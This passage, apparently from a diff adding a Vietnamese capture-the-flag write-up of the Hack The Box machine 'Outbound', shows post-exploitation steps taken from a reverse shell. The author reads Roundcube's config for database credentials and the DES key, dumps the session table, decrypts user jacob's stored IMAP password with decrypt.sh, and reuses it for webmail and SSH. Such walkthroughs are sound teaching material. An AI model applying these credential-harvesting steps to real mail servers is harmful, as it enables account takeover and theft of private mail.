+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> www-data www-data     <span class="m">47</span> Aug  <span class="m">1</span>  <span class="m">2025</span> revshell.sh
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> www-data www-data   <span class="m">4096</span> Feb  <span class="m">8</span> 08:47 skins
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">1</span> www-data www-data   <span class="m">4096</span> Aug  <span class="m">1</span> 08:45 temp
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">14</span> www-data www-data   <span class="m">4096</span> Feb  <span class="m">8</span> 08:47 vendor
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data    <span class="m">653</span> Aug  <span class="m">1</span> 08:39 wget-log</span></span></code></pre></div></div>
+<p>Sau khi ngồi nghiên cứu source của <a href="https://github.com/roundcube/roundcubemail"  target="_blank" rel="noreferrer">Roundcubemail</a> trên github và kết hợp với những gì đang có, tôi tìm thấy phần config của DB trong thư mục config.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@mail:/var/www/html/roundcube$ cat config/config.inc.php
+</span></span><span class="line"><span class="cl">cat config/config.inc.php
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/*
+</span></span><span class="line"><span class="cl"> +-----------------------------------------------------------------------+
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Local configuration <span class="k">for</span> the Roundcube Webmail installation.           <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>                                                                       <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> This is a sample configuration file only containing the minimum       <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> setup required <span class="k">for</span> a functional installation. Copy more options       <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> from defaults.inc.php to this file to override the defaults.          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>                                                                       <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> This file is part of the Roundcube Webmail client                     <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Copyright <span class="o">(</span>C<span class="o">)</span> The Roundcube Dev Team                                  <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>                                                                       <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Licensed under the GNU General Public License version <span class="m">3</span> or            <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> any later version with exceptions <span class="k">for</span> skins <span class="p">&amp;</span> plugins.                <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> See the README file <span class="k">for</span> a full license statement.                     <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> +-----------------------------------------------------------------------+
+</span></span><span class="line"><span class="cl">*/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$config</span> <span class="o">=</span> <span class="o">[]</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Database connection string <span class="o">(</span>DSN<span class="o">)</span> <span class="k">for</span> read+write operations
+</span></span><span class="line"><span class="cl">// Format <span class="o">(</span>compatible with PEAR MDB2<span class="o">)</span>: db_provider://user:password@host/database
+</span></span><span class="line"><span class="cl">// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
+</span></span><span class="line"><span class="cl">// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
+</span></span><span class="line"><span class="cl">// NOTE: <span class="k">for</span> SQLite use absolute path <span class="o">(</span>Linux<span class="o">)</span>: <span class="s1">&#39;sqlite:////full/path/to/sqlite.db?mode=0646&#39;</span>
+</span></span><span class="line"><span class="cl">//       or <span class="o">(</span>Windows<span class="o">)</span>: <span class="s1">&#39;sqlite:///C:/full/path/to/sqlite.db&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$config</span><span class="o">[</span><span class="s1">&#39;db_dsnw&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="s1">&#39;mysql://roundcube:**********@localhost/roundcube&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// IMAP host chosen to perform the log-in.
+</span></span><span class="line"><span class="cl">// See defaults.inc.php <span class="k">for</span> the option description.
+</span></span><span class="line"><span class="cl"><span class="nv">$config</span><span class="o">[</span><span class="s1">&#39;imap_host&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="s1">&#39;localhost:143&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// SMTP server host <span class="o">(</span><span class="k">for</span> sending mails<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">// See defaults.inc.php <span class="k">for</span> the option description.
+</span></span><span class="line"><span class="cl"><span class="nv">$config</span><span class="o">[</span><span class="s1">&#39;smtp_host&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="s1">&#39;localhost:587&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// SMTP username <span class="o">(</span><span class="k">if</span> required<span class="o">)</span> <span class="k">if</span> you use %u as the username Roundcube
+</span></span><span class="line"><span class="cl">// will use the current username <span class="k">for</span> login
+</span></span><span class="line"><span class="cl"><span class="nv">$config</span><span class="o">[</span><span class="s1">&#39;smtp_user&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="s1">&#39;%u&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// SMTP password <span class="o">(</span><span class="k">if</span> required<span class="o">)</span> <span class="k">if</span> you use %p as the password Roundcube
+</span></span><span class="line"><span class="cl">// will use the current user<span class="s1">&#39;s password for login
+</span></span></span><span class="line"><span class="cl"><span class="s1">$config[&#39;</span>smtp_pass<span class="s1">&#39;] = &#39;</span>%p<span class="s1">&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">// provide an URL where a user can get support for this Roundcube installation
+</span></span></span><span class="line"><span class="cl"><span class="s1">// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
+</span></span></span><span class="line"><span class="cl"><span class="s1">$config[&#39;</span>support_url<span class="s1">&#39;] = &#39;&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">// Name your service. This is displayed on the login screen and in the window title
+</span></span></span><span class="line"><span class="cl"><span class="s1">$config[&#39;</span>product_name<span class="s1">&#39;] = &#39;</span>Roundcube Webmail<span class="s1">&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">// This key is used to encrypt the users imap password which is stored
+</span></span></span><span class="line"><span class="cl"><span class="s1">// in the session record. For the default cipher method it must be
+</span></span></span><span class="line"><span class="cl"><span class="s1">// exactly 24 characters long.
+</span></span></span><span class="line"><span class="cl"><span class="s1">// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
+</span></span></span><span class="line"><span class="cl"><span class="s1">$config[&#39;</span>des_key<span class="s1">&#39;] = &#39;</span>rcmail-!24ByteDESkey*Str<span class="s1">&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">// List of active plugins (in plugins/ directory)
+</span></span></span><span class="line"><span class="cl"><span class="s1">$config[&#39;</span>plugins<span class="s1">&#39;] = [
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;</span>archive<span class="s1">&#39;,
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;</span>zipdownload<span class="s1">&#39;,
+</span></span></span><span class="line"><span class="cl"><span class="s1">];
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">// skin name: folder from skins/
+</span></span></span><span class="line"><span class="cl"><span class="s1">$config[&#39;</span>skin<span class="s1">&#39;] = &#39;</span>elastic<span class="s1">&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s1">$config[&#39;</span>default_host<span class="s1">&#39;] = &#39;</span>localhost<span class="s1">&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s1">$config[&#39;</span>smtp_server<span class="s1">&#39;] = &#39;</span>localhost<span class="err">&#39;</span><span class="p">;</span></span></span></code></pre></div></div>
+<p>Trước khi truy cập DB thì tôi muốn note lại một số thông tin về thằng Roundcubemail này.</p>
+<p>Về cơ bản thì vì nó là 1 mail server nên là nó có smtp, có imap và sử dụng mysql làm DB. Tuy nhiên, Roundcubemail không lưu thông tin đăng nhập của user trong DB, nó chỉ giữ trong session để duy trì kết nối IMAP và SMTP.</p>
+<p>Một phần nữa đáng chú ý là mã hóa</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">$config</span><span class="o">[</span><span class="s1">&#39;des_key&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="s1">&#39;rcmail-!24ByteDESkey*Str&#39;</span><span class="p">;</span></span></span></code></pre></div></div>
+<p>Đây là khóa mã hóa được dùng để mã hóa mật khẩu người dùng trong session. Nếu key này bị lộ, tôi có thể giải mã các session được lưu trong DB và lấy lại mật khẩu IMAP.</p>
+<p>Ngoài ra, bên trong source trên github tôi cũng tìm thấy <a href="https://github.com/roundcube/roundcubemail/blob/master/bin/decrypt.sh"  target="_blank" rel="noreferrer">decrypt.sh</a>, có thể là để giải mã session.</p>
+<p>Đăng nhập DB</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@mail:/var/www/html/roundcube$ mysql -u roundcube -p******** roundcube
+</span></span><span class="line"><span class="cl">&lt;ndcube$ mysql -u roundcube -p******** roundcube
+</span></span><span class="line"><span class="cl">Reading table information <span class="k">for</span> completion of table and column names
+</span></span><span class="line"><span class="cl">You can turn off this feature to get a quicker startup with -A
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
+</span></span><span class="line"><span class="cl">Your MariaDB connection id is <span class="m">42567</span>
+</span></span><span class="line"><span class="cl">Server version: 10.11.13-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">MariaDB <span class="o">[</span>roundcube<span class="o">]</span>&gt; show tables<span class="p">;</span>
+</span></span><span class="line"><span class="cl">show tables<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+---------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Tables_in_roundcube <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+---------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> cache               <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> cache_index         <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> cache_messages      <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> cache_shared        <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> cache_thread        <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> collected_addresses <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> contactgroupmembers <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> contactgroups       <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> contacts            <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dictionary          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> filestore           <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> identities          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> responses           <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> searches            <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> session             <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> system              <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> users               <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+---------------------+
+</span></span><span class="line"><span class="cl"><span class="m">17</span> rows in <span class="nb">set</span> <span class="o">(</span>0.000 sec<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">MariaDB <span class="o">[</span>roundcube<span class="o">]</span>&gt; <span class="k">select</span> * from session<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">select</span> * from session<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+----------------------------+---------------------+------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> sess_id                    <span class="p">|</span> changed             <span class="p">|</span> ip         <span class="p">|</span> vars                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----------------------------+---------------------+------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+                                                     <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 6a5ktqih5uca6lj8vrmgh9v0oh <span class="p">|</span> 2025-06-08 15:46:40 <span class="p">|</span> 172.17.0.1 <span class="p">|</span> bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1s*************** <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----------------------------+---------------------+------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+</span></span><span class="line"><span class="cl"><span class="m">8</span> rows in <span class="nb">set</span> <span class="o">(</span>0.000 sec<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">MariaDB <span class="o">[</span>roundcube<span class="o">]</span>&gt;</span></span></code></pre></div></div>
+<p>Thử decode bằng base64</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">language<span class="p">|</span>s:5:<span class="s2">&#34;en_US&#34;</span><span class="p">;</span>imap_namespace<span class="p">|</span>a:4:<span class="o">{</span>s:8:<span class="s2">&#34;personal&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>i:0<span class="p">;</span>a:2:<span class="o">{</span>i:0<span class="p">;</span>s:0:<span class="s2">&#34;&#34;</span><span class="p">;</span>i:1<span class="p">;</span>s:1:<span class="s2">&#34;/&#34;</span><span class="p">;</span><span class="o">}}</span>s:5:<span class="s2">&#34;other&#34;</span><span class="p">;</span>N<span class="p">;</span>s:6:<span class="s2">&#34;shared&#34;</span><span class="p">;</span>N<span class="p">;</span>s:10:<span class="s2">&#34;prefix_out&#34;</span><span class="p">;</span>s:0:<span class="s2">&#34;&#34;</span><span class="p">;</span><span class="o">}</span>imap_delimiter<span class="p">|</span>s:1:<span class="s2">&#34;/&#34;</span><span class="p">;</span>imap_list_conf<span class="p">|</span>a:2:<span class="o">{</span>i:0<span class="p">;</span>N<span class="p">;</span>i:1<span class="p">;</span>a:0:<span class="o">{}}</span>user_id<span class="p">|</span>i:1<span class="p">;</span>username<span class="p">|</span>s:5:<span class="s2">&#34;jacob&#34;</span><span class="p">;</span>storage_host<span class="p">|</span>s:9:<span class="s2">&#34;localhost&#34;</span><span class="p">;</span>storage_port<span class="p">|</span>i:143<span class="p">;</span>storage_ssl<span class="p">|</span>b:0<span class="p">;</span>password<span class="p">|</span>s:32:<span class="s2">&#34;L7Rv00A8TuwJA******xcSgnIk25Am/&#34;</span><span class="p">;</span>login_time<span class="p">|</span>i:1749397119<span class="p">;</span>timezone<span class="p">|</span>s:13:<span class="s2">&#34;Europe/London&#34;</span><span class="p">;</span>STORAGE_SPECIAL-USE<span class="p">|</span>b:1<span class="p">;</span>auth_secret<span class="p">|</span>s:26:<span class="s2">&#34;DpYqv6maI9HxDL5GhcCd8JaQQW&#34;</span><span class="p">;</span>request_token<span class="p">|</span>s:32:<span class="s2">&#34;TIsOaABA1zHSXZOBpH6up5XFyayNRHaw&#34;</span><span class="p">;</span>task<span class="p">|</span>s:4:<span class="s2">&#34;mail&#34;</span><span class="p">;</span>skin_config<span class="p">|</span>a:7:<span class="o">{</span>s:17:<span class="s2">&#34;supported_layouts&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>i:0<span class="p">;</span>s:10:<span class="s2">&#34;widescreen&#34;</span><span class="p">;</span><span class="o">}</span>s:22:<span class="s2">&#34;jquery_ui_colors_theme&#34;</span><span class="p">;</span>s:9:<span class="s2">&#34;bootstrap&#34;</span><span class="p">;</span>s:18:<span class="s2">&#34;embed_css_location&#34;</span><span class="p">;</span>s:17:<span class="s2">&#34;/styles/embed.css&#34;</span><span class="p">;</span>s:19:<span class="s2">&#34;editor_css_location&#34;</span><span class="p">;</span>s:17:<span class="s2">&#34;/styles/embed.css&#34;</span><span class="p">;</span>s:17:<span class="s2">&#34;dark_mode_support&#34;</span><span class="p">;</span>b:1<span class="p">;</span>s:26:<span class="s2">&#34;media_browser_css_location&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;none&#34;</span><span class="p">;</span>s:21:<span class="s2">&#34;additional_logo_types&#34;</span><span class="p">;</span>a:3:<span class="o">{</span>i:0<span class="p">;</span>s:4:<span class="s2">&#34;dark&#34;</span><span class="p">;</span>i:1<span class="p">;</span>s:5:<span class="s2">&#34;small&#34;</span><span class="p">;</span>i:2<span class="p">;</span>s:10:<span class="s2">&#34;small-dark&#34;</span><span class="p">;</span><span class="o">}}</span>imap_host<span class="p">|</span>s:9:<span class="s2">&#34;localhost&#34;</span><span class="p">;</span>page<span class="p">|</span>i:1<span class="p">;</span>mbox<span class="p">|</span>s:5:<span class="s2">&#34;INBOX&#34;</span><span class="p">;</span>sort_col<span class="p">|</span>s:0:<span class="s2">&#34;&#34;</span><span class="p">;</span>sort_order<span class="p">|</span>s:4:<span class="s2">&#34;DESC&#34;</span><span class="p">;</span>STORAGE_THREAD<span class="p">|</span>a:3:<span class="o">{</span>i:0<span class="p">;</span>s:10:<span class="s2">&#34;REFERENCES&#34;</span><span class="p">;</span>i:1<span class="p">;</span>s:4:<span class="s2">&#34;REFS&#34;</span><span class="p">;</span>i:2<span class="p">;</span>s:14:<span class="s2">&#34;ORDEREDSUBJECT&#34;</span><span class="p">;</span><span class="o">}</span>STORAGE_QUOTA<span class="p">|</span>b:0<span class="p">;</span>STORAGE_LIST-EXTENDED<span class="p">|</span>b:1<span class="p">;</span>list_attrib<span class="p">|</span>a:6:<span class="o">{</span>s:4:<span class="s2">&#34;name&#34;</span><span class="p">;</span>s:8:<span class="s2">&#34;messages&#34;</span><span class="p">;</span>s:2:<span class="s2">&#34;id&#34;</span><span class="p">;</span>s:11:<span class="s2">&#34;messagelist&#34;</span><span class="p">;</span>s:5:<span class="s2">&#34;class&#34;</span><span class="p">;</span>s:42:<span class="s2">&#34;listing messagelist sortheader fixedheader&#34;</span><span class="p">;</span>s:15:<span class="s2">&#34;aria-labelledby&#34;</span><span class="p">;</span>s:22:<span class="s2">&#34;aria-label-messagelist&#34;</span><span class="p">;</span>s:9:<span class="s2">&#34;data-list&#34;</span><span class="p">;</span>s:12:<span class="s2">&#34;message_list&#34;</span><span class="p">;</span>s:14:<span class="s2">&#34;data-label-msg&#34;</span><span class="p">;</span>s:18:<span class="s2">&#34;The list is empty.&#34;</span><span class="p">;</span><span class="o">}</span>unseen_count<span class="p">|</span>a:2:<span class="o">{</span>s:5:<span class="s2">&#34;INBOX&#34;</span><span class="p">;</span>i:2<span class="p">;</span>s:5:<span class="s2">&#34;Trash&#34;</span><span class="p">;</span>i:0<span class="p">;</span><span class="o">}</span>folders<span class="p">|</span>a:1:<span class="o">{</span>s:5:<span class="s2">&#34;INBOX&#34;</span><span class="p">;</span>a:2:<span class="o">{</span>s:3:<span class="s2">&#34;cnt&#34;</span><span class="p">;</span>i:2<span class="p">;</span>s:6:<span class="s2">&#34;maxuid&#34;</span><span class="p">;</span>i:3<span class="p">;</span><span class="o">}}</span>list_mod_seq<span class="p">|</span>s:2:<span class="s2">&#34;10&#34;</span><span class="p">;</span></span></span></code></pre></div></div>
+<p>Tôi có user <code>jacob</code> và password dưới dạng mã hóa <code>L7Rv00A8TuwJA******xcSgnIk25Am/</code></p>
+<p>Sử dụng <a href="https://github.com/roundcube/roundcubemail/blob/master/bin/decrypt.sh"  target="_blank" rel="noreferrer">decrypt.sh</a> để thử giải mã nó</p>
+<p>Trên reverse shell</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@mail:/var/www/html/roundcube$ ./bin/decrypt.sh <span class="s1">&#39;L7Rv00A8TuwJA******xcSgnIk25Am/&#39;</span>
+</span></span><span class="line"><span class="cl">&lt;./bin/decrypt.sh <span class="s1">&#39;L7Rv00A8TuwJA******xcSgnIk25Am/&#39;</span>
+</span></span><span class="line"><span class="cl">595mO8D******</span></span></code></pre></div></div>
+<p>Thử đăng nhập vào những nơi có thể bao gồm ssh và webmail, tôi có user webmail mới</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="one"
+    src="2.png"
+    ></figure>
+<p>Một trong 2 mail có chứa một password của <code>jacob</code>. Thử nó với ssh</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>neo㉿fs0ci3ty<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ssh jacob@mail.outbound.htb
+</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;mail.outbound.htb (10.10.11.77)&#39;</span> can<span class="s1">&#39;t be established.
+</span></span></span><span class="line"><span class="cl"><span class="s1">ED25519 key fingerprint is SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0.
+</span></span></span><span class="line"><span class="cl"><span class="s1">This key is not known by any other names.
